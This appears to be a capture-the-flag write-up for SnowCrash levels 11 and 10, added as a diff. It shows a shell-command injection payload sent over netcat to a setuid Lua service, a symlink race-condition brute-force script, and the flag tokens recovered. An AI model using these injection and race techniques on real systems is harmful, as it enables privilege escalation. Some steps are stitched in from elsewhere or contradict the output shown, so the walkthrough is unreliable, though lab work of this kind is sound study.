@@ -1,0 +1,128 @@
+# Okay lets see what we have by doing a ls -la
+
+level11@SnowCrash:~$ ls -la
+total 16
+dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
+-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
+-r-x------  1 level11 level11  675 Apr  3  2012 .profile
+-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
+
+# Lets see what happens when running the file
+
+level11@SnowCrash:~$ ./level11.lua
+lua: ./level11.lua:3: address already in use
+stack traceback:
+	[C]: in function 'assert'
+	./level11.lua:3: in main chunk
+	[C]: ?
+
+# Lets see whats in level11.lua
+
+level11@SnowCrash:~$ vim level11.lua
+
+  1 #!/usr/bin/env lua
+  2 local socket = require("socket")
+  3 local server = assert(socket.bind("127.0.0.1", 5151))
+  4
+  5 function hash(pass)
+  6   prog = io.popen("echo "..pass.." | sha1sum", "r")
+  7   data = prog:read("*all")
+  8   prog:close()
+  9
+ 10   data = string.sub(data, 1, 40)
+ 11
+ 12   return data
+ 13 end
+ 14
+ 15
+ 16 while 1 do
+ 17   local client = server:accept()
+ 18   client:send("Password: ")
+ 19   client:settimeout(60)
+ 20   local l, err = client:receive()
+ 21   if not err then
+ 22       print("trying " .. l)
+ 23       local h = hash(l)
+ 24
+ 25       if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+ 26           client:send("Erf nope..\n");
+ 27       else
+ 28           client:send("Gz you dumb*\n")
+ 29       end
+ 30
+ 31   end
+ 32
+ 33   client:close()
+ 34 end
+
+# We see a few important things in the file.
+	We see on line 3 we have some important information 
+		local server = assert(socket.bind("127.0.0.1", 5151))
+#	We also see that it will funtion in line 5 on line 23 of the program  
+		prog = io.popen("echo "..pass.." | sha1sum", "r")
+	The above line will use io.popen which 
+	Starts program prog in a separated process and returns a file handle that you can use to read data from this program 
+	(if mode is "r", the default) or to write data to this program (if mode is "w"). 
+
+# Lets see if we can exploit it with echo and using nc with our port 5151  and give us the password too and 6969 only gives the flag
+#	Note localhost 5151 is home in networking
+echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
+
+level11@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
+Password: Erf nope..
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+level11@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 6969 && cat /tmp/Gabe
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+# OOPS this did not work. when I enter the password it did not work
+
+# 	Okay but it wasn't a complete waste and we show that we are on the correct path and we need to use port 6969 instead
+
+We decompile on an online tool, and we realize that there is a race condition: If between the call to access and the call to open, 
+the file named by argv [1] changes, we can read an arbitrary file.
+
+# So we open a shell on which we listen in loop with the following command:
+#	while [42]; do nc-1 6969; therefore
+
+vim listener.sh
+
+#!/bin/sh
+while [ 42 ] ; do nc -l 6969; done
+
+# We create a shell script that will try to bruteforce this race condition: It will call the binary between two calls to ln to try to 
+#	change the symbolic link running. We see the following password in our second shell:
+
+vim bruteForce.sh
+#!/bin/sh
+touch /tmp/gabe
+  while true; do
+       ln -sf /tmp/gabe /tmp/copyToken  &
+       /home/user/level10/level10 /tmp/copyToken 127.0.0.1 &
+       ln -sf /home/user/level10/token /tmp/copyToken &
+  done
+
+# Note you will need 2 terminals conntected to the ssh level10@192.168.56.101 -p 4242
+# 	Run the listener.sh first on the one.
+#		On the other run bruteforce.sh
+#	once you see the below then stop the listener.sh with control c
+
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+^C
+
+# The above is your password for the flag10
+
+level10@SnowCrash:~$ su flag10
+Password: woupa2yuojeeaaed06riuj63c
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
+
+Resources
+http://pgl.yoyo.org/luai/i/io.popen
+
